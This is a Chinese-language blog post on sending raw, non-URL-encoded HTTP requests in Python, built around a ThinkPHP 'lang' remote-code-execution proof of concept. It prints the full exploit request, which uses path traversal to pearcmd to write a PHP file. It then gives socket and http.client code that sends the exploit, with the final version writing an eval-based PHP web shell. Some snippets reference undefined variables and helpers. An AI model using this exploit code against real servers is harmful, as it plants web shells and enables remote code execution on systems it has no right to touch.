---
author: Noel
pubDatetime: 2023-3-26T23:42:31.000+08:00
modDatetime: 2023-3-26T23:42:31.000+08:00
title: Python 不使用 Urlencode 编码发送请求内容的解决方案
featured: false
draft: false
tags:
  - Coding
  - Python
description: 
   Python 不使用 Urlencode 编码发送请求内容的解决方案...
---


## **前言**

讲道理, 这要求还挺离谱的，属于是不按协议出牌了.

以前两个月出的 `thinkphp lang rce`  的 `poc` 为例:

```
GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

如果使用 `Python` 的 `requests` , 会默认将`< >` 进行`urlencode` 编码,导致不能成功写入shell.

## **正文**

### **socket**

使用默认的`socket`发送原生`HTTP`请求包就能够避免`urlencode`编码问题,示例代码如下:

```
import socket

# Accept-Encoding: gzip, deflate
RAW_REQUEST_TEMPLATE = '''GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
Host: 172.17.11.113:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close

'''

# host_info, raw_request = parse_url_and_raw_request(url)
host_info = parse_url_and_raw_request(url)

raw_request = RAW_REQUEST_TEMPLATE.replace("\n", "\r\n")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(raw_request.encode())

    # Receive the server's response
    response = s.recv(1024)
    print(response.decode())
```

以上代码有两个注意事项:

1. **必须**将原生`HTTP` 请求中的 `\n` 使用 `\r\n` 代替, 否则会出现`bad request` 报错. 这里踩了一个大坑,卡了很久,希望有同样需求的师傅们特别注意一下.
2. 关于最后一行的`response.decode()`. 如果原生`HTTP`请求中没有使用`Accept-Encoding: gzip, deflate`等允许客户端接受的加密类型 请求头,默认使用 `decode()`函数解密就行了, 如果使用了上诉请求头, `Accept-Encoding: gzip, deflate` 为例,就需要使用 `gzip`函数来解密.代码如下:

```
import gzip
response = s.recv(1024)
data = gzip.decompress(response).decode("utf-8")
```

### **http.client**

这个方法是`ChatGPT`告诉我的, 在`socket` 的`\n` 没有替换之前一直卡住了, 然后`CHATGPT`告诉了我这个解决方案.

关键代码如下:

```
import http.client
import gzip

HEADERS = {
    "Content-type": "text/plain",
    "Upgrade-Insecure-Requests": 1,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
}

def make_request(host:str,port:int, path:str, method:str="GET", body=None, headers=None):
    conn = http.client.HTTPConnection(
        host,
        port
        )
    conn.request(method, path, body=body, headers=headers)
    response = conn.getresponse()
    conn.close()
    data = response.read()
    data = gzip.decompress(data).decode("utf-8")

    return data

if __name__ == "__main__":
    data = make_request(
        host,
        port,
        f"/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST['{webshell_pass}'])?>+{file_name}",
        headers=HEADERS
        )

```

注意事项同 `socket` 的第二点:

如果原生`HTTP`请求中没有使用`Accept-Encoding: gzip, deflate`等允许客户端接受的加密类型 请求头,默认使用 `decode()`函数解密就行了, 如果使用了上诉请求头, `Accept-Encoding: gzip, deflate` 为例,就需要使用 `gzip`函数来解密